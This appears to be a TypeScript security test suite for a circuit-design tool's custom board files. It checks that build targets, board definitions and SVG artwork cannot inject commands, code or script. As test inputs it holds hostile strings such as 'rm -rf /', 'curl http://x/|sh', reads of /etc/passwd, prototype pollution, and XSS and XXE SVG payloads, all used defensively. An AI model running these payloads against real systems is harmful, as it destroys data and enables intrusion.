// A board file is untrusted input, and this is where that is held to.
//
// Everything in a .cdboard.json arrived from somewhere else: a colleague, a
// forum post, a link. The rules it lives under were stated once and are checked
// here, one section per rule:
//
//   * it cannot execute anything — no shell, no Node, no eval, no module;
//   * it cannot choose what the compiler service runs;
//   * it cannot inject script through artwork;
//   * it cannot read or name anything on the server's filesystem;
//   * it cannot exceed the bounds — pins, sizes, string lengths, arrays;
//   * it cannot claim a capability it does not have.
//
// The FQBN section is the sharpest of these, because it is the one place user
// text legitimately reaches a compiler invocation. It is checked on BOTH sides
// deliberately: the client refuses it because the user should be told, and the
// service refuses it again because the client is not the trust boundary.

import { resolveRequestedFqbn, SUPPORTED_TARGETS, findTarget } from '../server/compiler/types.js';
import { PINNED_CORES } from '../server/compiler/cores.js';
import { validateCustomBoard, isError } from '../src/custom-boards/validate';
import { importBoardBundle, exportBoardBundle } from '../src/custom-boards/bundle';
import { sanitizeBoardSvg, looksHostile } from '../src/custom-boards/svgSanitize';
import { resolveCustomBoard } from '../src/custom-boards/resolve';
import { CUSTOM_BOARD_LIMITS, CUSTOM_BOARD_SCHEMA_VERSION, type CustomBoardDefinition } from '../src/custom-boards/schema';
import { readFileSync } from 'node:fs';

let failures = 0;
function check(cond: boolean, msg: string) {
  console.log(cond ? 'PASS:' : 'FAIL:', msg);
  if (!cond) failures++;
}
function section(t: string) {
  console.log(`\n--- ${t}`);
}

const ALLOWED = PINNED_CORES.flatMap((c) => c.targets);
const uno = findTarget('board.arduino-uno', 'board.arduino-uno')!;
const pico = findTarget('board.raspberry-pi-pico', 'board.raspberry-pi-pico')!;

const base = (over: Partial<CustomBoardDefinition> = {}): CustomBoardDefinition => ({
  schemaVersion: CUSTOM_BOARD_SCHEMA_VERSION,
  id: 'custom.hostile',
  revision: 1,
  identity: { name: 'Hostile Board' },
  outline: { widthMm: 20, heightMm: 30 },
  pins: [{ id: 'LED', label: 'LED', pad: 'GP15', xMm: 2, yMm: 2, type: 'digital', capabilities: [] }],
  processorProfileId: 'proc.rp2040',
  compileProfileId: 'compile.rp2040-arduino',
  runtimeProfileId: 'runtime.rp2040js',
  ...over,
});

// ============================== 1. the FQBN cannot become a command =========
section('1. a build target is a name from a list, not a string to run');
{
  // Every one of these is refused. None of them is escaped, trimmed or
  // repaired: the answer to a build target we do not recognise is no.
  const hostile = [
    'arduino:avr:uno; rm -rf /',
    'arduino:avr:uno && curl http://x/|sh',
    '$(cat /etc/passwd)',
    '`id`',
    'arduino:avr:uno --build-property recipe.hooks.prebuild.1.pattern=/bin/sh',
    'arduino:avr:uno\nrm -rf /',
    '../../../../bin/sh',
    'arduino:avr:uno:cpu=atmega8',
    'file:///etc/shadow',
    'arduino:avr:uno ',
  ];
  for (const attempt of hostile) {
    const result = resolveRequestedFqbn(uno, attempt, ALLOWED);
    check('error' in result, `refused: ${JSON.stringify(attempt).slice(0, 60)}`);
  }

  // Nor may it be a target this service is not built against, even a real one.
  check('error' in resolveRequestedFqbn(uno, 'esp8266:esp8266:generic', ALLOWED), 'a core we do not ship is refused');
  check(
    'error' in resolveRequestedFqbn(pico, 'arduino:avr:uno', ALLOWED),
    'and a target from another core is refused even though it is on the allowlist',
  );
  check(
    'error' in resolveRequestedFqbn(uno, 'arduino:avr:mega', ALLOWED),
    'and a target for a different chip in the SAME core is refused, because the firmware would not run',
  );

  // The legitimate case still works, which is what makes the feature worth
  // having rather than worth removing.
  const ok = resolveRequestedFqbn(pico, 'rp2040:rp2040:rpipicow', ALLOWED);
  check('fqbn' in ok && ok.fqbn === 'rp2040:rp2040:rpipicow', 'a same-chip variant of the same core is allowed');
  const none = resolveRequestedFqbn(uno, undefined, ALLOWED);
  check('fqbn' in none && none.fqbn === uno.fqbn, 'and asking for nothing gets the target the board already had');

  // The refusal names what WAS allowed, so it is actionable rather than a wall.
  const refused = resolveRequestedFqbn(pico, 'arduino:avr:uno', ALLOWED) as { error: string };
  check(/rpipico/.test(refused.error), `the refusal says what may be built (${refused.error.slice(0, 110)})`);
}

// ============== 2. and the invocation cannot be a shell in the first place ===
section('2. the compiler is invoked with an argument array, never a command line');
{
  const cli = readFileSync('server/compiler/arduinoCli.ts', 'utf8');
  // `.exec(` is a regular expression; the dangerous one is child_process's.
  check(!/(?<![.\w])exec\(/.test(cli), 'arduinoCli never calls child_process exec()');
  check(
    !/import\s*\{[^}]*\bexec\b[^}]*\}\s*from\s*'node:child_process'/.test(cli),
    'and does not even import it',
  );
  check(!/shell:\s*true/.test(cli), 'and never asks for a shell');
  check(/execFile/.test(cli), 'it uses execFile, which takes arguments as a list');
  check(
    !/`[^`]*\$\{fqbn\}[^`]*`/.test(cli),
    'and the FQBN is never interpolated into a string that could be parsed as a command',
  );
  const service = readFileSync('server/compiler/compilerService.ts', 'utf8');
  check(/resolveRequestedFqbn/.test(service), 'the service resolves the requested target through the gate');
  check(!/(?<![.\w])exec\(|shell:\s*true/.test(service), 'and opens no shell of its own');
}

// ================================= 3. a board file cannot carry executable ===
section('3. a board definition has nowhere to put code');
{
  const smuggled = {
    ...base(),
    // Every shape somebody would reach for.
    onLoad: 'fetch("http://x")',
    script: '<script>alert(1)</script>',
    require: 'node:child_process',
    import: '/etc/passwd',
    compileCommand: 'rm -rf /',
    buildFlags: ['-Wl,--wrap=main'],
    hooks: { prebuild: '/bin/sh' },
    __proto__: { polluted: true },
  } as unknown;

  const { board, problems } = validateCustomBoard(smuggled);
  check(board !== undefined, `the board is still read${problems.filter(isError).map((p) => ` — ${p.message}`).join('')}`);
  const asRecord = board as unknown as Record<string, unknown>;
  for (const key of ['onLoad', 'script', 'require', 'import', 'compileCommand', 'buildFlags', 'hooks']) {
    check(!(key in asRecord), `"${key}" did not survive validation`);
  }
  check(
    ({} as Record<string, unknown>).polluted === undefined,
    'and nothing was written onto Object.prototype on the way through',
  );

  // The validator builds a new object from known fields rather than filtering a
  // supplied one, which is why the list above cannot go stale.
  const validator = readFileSync('src/custom-boards/validate.ts', 'utf8');
  check(!/\.\.\.\s*d\b/.test(validator), 'the validator never spreads the input object into its output');
  check(!/eval\(|new Function|import\(/.test(validator), 'and contains no way to evaluate anything');

  const resolver = readFileSync('src/custom-boards/resolve.ts', 'utf8');
  check(!/eval\(|new Function|import\(/.test(resolver), 'nor does the resolver');
}

// ==================================== 4. artwork is a drawing or it is not ===
section('4. artwork cannot carry script or fetch anything');
{
  const attacks: [string, string][] = [
    ['a script element', '<svg xmlns="http://www.w3.org/2000/svg"><script>fetch("//x")</script></svg>'],
    ['an event handler', '<svg xmlns="http://www.w3.org/2000/svg"><rect onload="alert(1)" width="1" height="1"/></svg>'],
    ['a foreignObject', '<svg xmlns="http://www.w3.org/2000/svg"><foreignObject><iframe src="//x"/></foreignObject></svg>'],
    ['an external image', '<svg xmlns="http://www.w3.org/2000/svg"><image href="http://x/pixel.png"/></svg>'],
    ['a javascript: link', '<svg xmlns="http://www.w3.org/2000/svg"><a href="javascript:alert(1)"><rect width="1" height="1"/></a></svg>'],
    ['an XXE doctype', '<!DOCTYPE svg [<!ENTITY x SYSTEM "file:///etc/passwd">]><svg xmlns="http://www.w3.org/2000/svg"><text>&x;</text></svg>'],
    ['a use pointing outside', '<svg xmlns="http://www.w3.org/2000/svg"><use href="http://x#a"/></svg>'],
  ];
  for (const [what, svg] of attacks) {
    const hostile = looksHostile(svg);
    const sanitized = sanitizeBoardSvg(svg);
    // Either refused outright, or rebuilt with the dangerous part gone. Outside
    // a browser there is no parser, and the honest answer there is no artwork.
    const safe = hostile !== null || sanitized.svg === null || !/script|onload|javascript:|foreignObject|http/i.test(sanitized.svg);
    check(safe, `${what} cannot survive`);
  }

  // A bundle carrying hostile artwork is refused as a whole, with the reason.
  const bundle = JSON.stringify({
    kind: 'circuitdesk-board',
    bundleVersion: 1,
    exportedAt: new Date().toISOString(),
    exportedBy: 'x',
    board: base({ outline: { widthMm: 20, heightMm: 30, artworkSvg: '<svg><script>x()</script></svg>' } }),
  });
  const opened = importBoardBundle(bundle);
  check(opened.board === undefined, 'a bundle with a script in its artwork is refused');
  check(
    opened.problems.some((p) => p.code === 'hostile-artwork'),
    `by that reason and not a vague one (${opened.problems.map((p) => p.code).join(', ')})`,
  );
}

// ============================ 5. no filesystem, no network, no paths ========
section('5. a board cannot name anything on anybody\'s machine');
{
  const pathy = base({
    identity: { name: 'Pathy', description: 'artwork at /etc/passwd' },
    outline: { widthMm: 20, heightMm: 30, artworkSvg: undefined },
  });
  const { json, problems } = exportBoardBundle(pathy);
  check(
    problems.some((p) => p.code === 'path-in-bundle'),
    'a path in a board is pointed out on the way OUT, where the author can still fix it',
  );
  check(!json.includes('file://'), 'and the bundle carries no URL scheme of its own');

  const definition = readFileSync('src/custom-boards/resolve.ts', 'utf8')
    + readFileSync('src/custom-boards/validate.ts', 'utf8')
    + readFileSync('src/custom-boards/bundle.ts', 'utf8');
  check(!/node:fs|readFile|fetch\(|XMLHttpRequest/.test(definition), 'nothing in the custom-board path reads a file or opens a socket');
}

// ================================================= 6. the bounds are bounds ==
section('6. everything is bounded, and the bound is enforced not documented');
{
  const tooManyPins = base({
    pins: Array.from({ length: CUSTOM_BOARD_LIMITS.maxPins + 40 }, (_, i) => ({
      id: `P${i}`, label: `P${i}`, pad: null, xMm: 1, yMm: 1, type: 'digital' as const, capabilities: [],
    })),
  });
  check(
    validateCustomBoard(tooManyPins).problems.some((p) => isError(p) && /pins/i.test(p.message)),
    `${CUSTOM_BOARD_LIMITS.maxPins + 40} pins is refused`,
  );

  const hugeName = base({ identity: { name: 'x'.repeat(5000) } });
  const named = validateCustomBoard(hugeName);
  check(
    (named.board?.identity.name.length ?? 0) <= CUSTOM_BOARD_LIMITS.maxNameLength || named.problems.some(isError),
    'a 5000-character name is refused or cut to the limit',
  );

  const hugeBoard = base({ outline: { widthMm: 100000, heightMm: 100000 } });
  check(
    validateCustomBoard(hugeBoard).problems.some(isError),
    'a 100-metre board is refused',
  );

  const hugeArtwork = base({
    outline: { widthMm: 20, heightMm: 30, artworkSvg: `<svg>${'<rect/>'.repeat(200_000)}</svg>` },
  });
  check(
    validateCustomBoard(hugeArtwork).problems.some((p) => isError(p) && /artwork|large|KB/i.test(p.message)),
    'and artwork past the size limit is refused rather than stored',
  );

  const oversized = 'x'.repeat(CUSTOM_BOARD_LIMITS.maxArtworkBytes + 400_000);
  const start = Date.now();
  importBoardBundle(oversized);
  check(Date.now() - start < 1000, `an oversized file is rejected on size before parsing (${Date.now() - start} ms)`);
}

// ========================= 7. a board cannot claim what it cannot do =========
section('7. capability comes from the profiles, never from the file');
{
  const liar = {
    ...base({ processorProfileId: null, compileProfileId: 'compile.none', runtimeProfileId: 'runtime.none' }),
    supportLevel: 'simulated',
    simulation: { engine: 'rp2040js', supported: true, supportedApis: ['everything'], supportedPeripherals: ['all'] },
    compiler: { provider: 'arduino-cli', supported: true, fqbn: 'rp2040:rp2040:rpipico' },
  } as unknown;

  const { board } = validateCustomBoard(liar);
  check(board !== undefined, 'the board is read');
  const { board: resolved } = resolveCustomBoard(board!);
  check(resolved.supportLevel === 'wiring', `and it is wiring-only anyway (${resolved.supportLevel})`);
  check(resolved.simulation?.supported === false, 'its claim to be simulated did not survive');
  check(resolved.compiler?.supported === false, 'nor its claim to compile');
  check(
    (resolved.simulation?.supportedApis.length ?? 1) === 0,
    'and it claims no APIs, because the runtime it has provides none',
  );

  // The same lie with a real processor: capability still comes from the runtime.
  const { board: real, problems: realProblems } = validateCustomBoard({
    ...(liar as object),
    processorProfileId: 'proc.esp32c6',
    compileProfileId: 'compile.esp32c6-arduino',
    runtimeProfileId: 'runtime.esp32c6',
    pins: [{ id: 'LED', label: 'LED', pad: 'IO15', xMm: 2, yMm: 2, type: 'digital', capabilities: [] }],
  });
  check(real !== undefined, `a real C6 board is read${realProblems.filter(isError).map((p) => ` — ${p.message}`).join('')}`);
  const { board: resolvedReal } = resolveCustomBoard(real!);
  check(
    !resolvedReal.simulation?.supportedApis.includes('everything'),
    `a made-up API name does not reach the board (${resolvedReal.simulation?.supportedApis.join(', ')})`,
  );
}

// ============================== 8. the compile allowlist still holds =========
section('8. the service allowlist is unchanged by any of this');
{
  check(
    SUPPORTED_TARGETS.every((t) => ALLOWED.includes(t.fqbn) || !ALLOWED.some((f) => f.startsWith(`${t.core}:`))),
    'every supported target belongs to a pinned core',
  );
  check(findTarget('anything', 'custom.made-up-board') === undefined, 'a custom board id is NOT on the compile allowlist');
  check(
    findTarget('anything', 'board.raspberry-pi-pico') !== undefined,
    'and a custom board reaches the compiler by naming the target its pipeline uses',
  );

  const server = readFileSync('server/index.ts', 'utf8');
  check(/compileLimiter/.test(server), 'the public compile rate limiter is still applied');
}

console.log(failures === 0 ? '\nCustom-board security checks passed.' : `\n${failures} check(s) FAILED`);
process.exit(failures === 0 ? 0 : 1);
